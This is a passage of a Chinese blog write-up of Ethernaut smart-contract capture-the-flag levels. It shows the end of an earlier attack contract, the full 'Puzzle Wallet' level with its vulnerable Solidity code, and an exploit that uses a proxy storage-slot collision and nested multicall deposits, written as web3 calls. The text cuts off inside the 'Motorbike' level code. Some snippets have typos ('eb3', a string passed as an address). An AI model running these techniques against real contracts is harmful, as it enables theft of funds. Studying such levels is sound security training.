punctuation\">)</span><span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span>\n        target<span class=\"token punctuation\">.</span><span class=\"token function\">swap</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span>to<span class=\"token punctuation\">,</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">IERC20</span> <span class=\"token keyword\">is</span> attack<span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>使用该合约进行攻击，剩下的就是数学问题了</p>\n<h1 id=\"24-Puzzle-Wallet\"><a href=\"#24-Puzzle-Wallet\" class=\"headerlink\" title=\"24.Puzzle Wallet\"></a>24.Puzzle Wallet</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>题目要求：</p>\n<p>Nowadays, paying for DeFi operations is impossible, fact.</p>\n<p>A group of friends discovered how to slightly decrease the cost of performing multiple transactions by batching them in one transaction, so they developed a smart contract for doing this.</p>\n<p>They needed this contract to be upgradeable in case the code contained a bug, and they also wanted to prevent people from outside the group from using it. To do so, they voted and assigned two people with special roles in the system: The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.</p>\n<p>Little did they know, their lunch money was at risk…</p>\n<p> You’ll need to hijack this wallet to become the admin of the proxy.</p>\n<p> Things that might help::</p>\n<ul>\n<li>Understanding how <code>delegatecall</code>s work and how <code>msg.sender</code> and <code>msg.value</code> behaves when performing one.</li>\n<li>Knowing about proxy patterns and the way they handle storage variables.</li>\n</ul></blockquote>\n<h2 id=\"Code-23\"><a href=\"#Code-23\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">pragma</span> experimental ABIEncoderV2<span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/math/SafeMath.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/proxy/UpgradeableProxy.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">PuzzleProxy</span> <span class=\"token keyword\">is</span> UpgradeableProxy <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> pendingAdmin<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> admin<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _admin<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _implementation<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> _initData<span class=\"token punctuation\">)</span> <span class=\"token function\">UpgradeableProxy</span><span class=\"token punctuation\">(</span>_implementation<span class=\"token punctuation\">,</span> _initData<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        admin <span class=\"token operator\">=</span> _admin<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">modifier</span> onlyAdmin <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> admin<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Caller is not the admin\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">proposeNewAdmin</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _newAdmin<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">&#123;</span>\n        pendingAdmin <span class=\"token operator\">=</span> _newAdmin<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">approveNewAdmin</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _expectedAdmin<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> onlyAdmin <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>pendingAdmin <span class=\"token operator\">==</span> _expectedAdmin<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Expected new admin by the current admin is not the pending admin\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        admin <span class=\"token operator\">=</span> pendingAdmin<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">upgradeTo</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _newImplementation<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> onlyAdmin <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">_upgradeTo</span><span class=\"token punctuation\">(</span>_newImplementation<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">PuzzleWallet</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">using</span> <span class=\"token class-name\">SafeMath</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> owner<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> maxBalance<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> whitelisted<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> balances<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">init</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _maxBalance<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>maxBalance <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Already initialized\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        maxBalance <span class=\"token operator\">=</span> _maxBalance<span class=\"token punctuation\">;</span>\n        owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">modifier</span> onlyWhitelisted <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>whitelisted<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Not whitelisted\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">setMaxBalance</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _maxBalance<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> onlyWhitelisted <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Contract balance is not 0\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      maxBalance <span class=\"token operator\">=</span> _maxBalance<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">addToWhitelist</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> addr<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> owner<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Not the owner\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        whitelisted<span class=\"token punctuation\">[</span>addr<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">deposit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> onlyWhitelisted <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance <span class=\"token operator\">&lt;=</span> maxBalance<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Max balance reached\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> value<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">calldata</span> data<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> onlyWhitelisted <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> value<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Insufficient balance\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">sub</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> success<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> to<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">&#123;</span> value<span class=\"token punctuation\">:</span> value <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>success<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Execution failed\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">multicall</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">calldata</span> data<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> onlyWhitelisted <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">bool</span> depositCalled <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> data<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> _data <span class=\"token operator\">=</span> data<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token builtin\">bytes4</span> selector<span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">assembly</span> <span class=\"token punctuation\">&#123;</span>\n                selector <span class=\"token operator\">:=</span> <span class=\"token function\">mload</span><span class=\"token punctuation\">(</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>_data<span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>selector <span class=\"token operator\">==</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>deposit<span class=\"token punctuation\">.</span>selector<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>depositCalled<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Deposit can only be called once\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token comment\">// Protect against reusing msg.value</span>\n                depositCalled <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> success<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">delegatecall</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>success<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Error while delegating call\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Analyze-22\"><a href=\"#Analyze-22\" class=\"headerlink\" title=\"Analyze\"></a>Analyze</h2><p>这道题切入点就是UpgradeableProxy合约，现在已经更名为ERC1967Upgrade。这道题存在槽碰撞，pendingAdmin和owner时通过一个插槽，所以修改pendingAdmin直接就是修改了owner。可以了解一下ERC1967Upgrade来认识这一点。</p>\n<p>虽然合约中的proposeNewAdmin不可以直接调用，但是可以通过web3来发送交易</p>\n<p>data&#x3D;selector+other</p>\n<p>运行之后owner变成了自己，再为自己添加白名单即可</p>\n<p>要劫持这个钱包就要成为admin，而现在可以改变admin的地方只有setMaxBalance，而这个函数要求合约余额为0，可以使合约余额减少的地方又只有execute()函数，这里只能去走存入的金额，合约将至少有0.001 ether，但是multicall使用了for循环调用，如果这里可以多次调用deposit那就可以随意增加自己的balances，但是显然这里限制了只能调用一次deposit()函数。</p>\n<p>此处看似严谨，但是如果我们可以将deposit()函数封装到零一个函数就可以绕过检测。所以构造data[deposit(),multicall(deposit())],这样既可绕过检测连续调用两次deposit，就可以达到用0.001 ether充值0.002 ether的效果取走合约的余额，调用setbalance()函数，参数为自己地址，即可劫持钱包。</p>\n<h2 id=\"Attack-20\"><a href=\"#Attack-20\" class=\"headerlink\" title=\"Attack\"></a>Attack</h2><p>获得owner</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\">web3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeFunctionSignature</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"proposeNewAdmin(address)\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nweb3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeParameter</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"address\"</span><span class=\"token punctuation\">,</span> player<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n再拼接得到data\n<span class=\"token keyword\">await</span> web3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span><span class=\"token function\">sendTransaction</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token literal-property property\">from</span><span class=\"token operator\">:</span> player<span class=\"token punctuation\">,</span> <span class=\"token literal-property property\">to</span><span class=\"token operator\">:</span> instance<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>增加balances</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\">data1 <span class=\"token operator\">=</span> web3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeFunctionSignature</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"deposit()\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\ndata3<span class=\"token operator\">=</span>web3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeParameter</span><span class=\"token punctuation\">(</span><span class=\"token string\">'bytes[]'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>data1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\ndata2 <span class=\"token operator\">=</span> eb3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeFunctionSignature</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"multicall(bytes[])\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\ndata4<span class=\"token operator\">=</span>data2<span class=\"token operator\">+</span>data3\n\n<span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">multicall</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>data1<span class=\"token punctuation\">,</span> data3<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token literal-property property\">value</span><span class=\"token operator\">:</span> <span class=\"token function\">toWei</span><span class=\"token punctuation\">(</span><span class=\"token string\">'0.001'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>获得admin</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">await</span> contract<span class=\"token punctuation\">.</span><span class=\"token function\">setMaxBalance</span><span class=\"token punctuation\">(</span><span class=\"token string\">'player'</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h1 id=\"25-Motorbike\"><a href=\"#25-Motorbike\" class=\"headerlink\" title=\"25.Motorbike\"></a>25.Motorbike</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>题目要求：destory the engine of the motorbike</p></blockquote>\n<h2 id=\"Code-24\"><a href=\"#Code-24\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">&lt;</span><span class=\"token version number\">0.7.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/utils/Address.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/proxy/Initializable.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Motorbike</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">// keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1</span>\n    <span class=\"token builtin\">bytes32</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">constant</span> _IMPLEMENTATION_SLOT <span class=\"token operator\">=</span> <span class=\"token number\">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">AddressSlot</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">address</span> value<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    \n    <span class=\"token comment\">// Initializes the upgradeable proxy with an initial implementation specified by `_logic`.</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _logic<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>Address<span class=\"token punctuation\">.</span><span class=\"token function\">isContract</span><span class=\"token punctuation\">(</span>_logic<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"ERC1967: new implementation is not a contract\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">_getAddressSlot</span><span class=\"token punctuation\">(</span>_IMPLEMENTATION_SLOT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>value <span class=\"token operator\">=</span> _logic<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> success<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> _logic<span class=\"token 